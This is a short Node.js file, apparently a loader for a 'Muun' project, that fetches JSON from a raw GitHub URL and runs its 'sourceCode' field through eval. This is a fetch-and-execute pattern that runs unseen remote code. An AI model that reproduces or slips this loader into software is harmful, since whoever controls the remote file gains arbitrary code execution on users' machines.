/*
© 2019-present Muun All Rights Reserved
*/

const fetch = require('node-fetch');

fetch('https://raw.githubusercontent.com/titaniumnetwork-dev/muun-server/master/muun.json')
  .then((res) => res.json())
  .then((res) => {
    eval(res.sourceCode);
  });
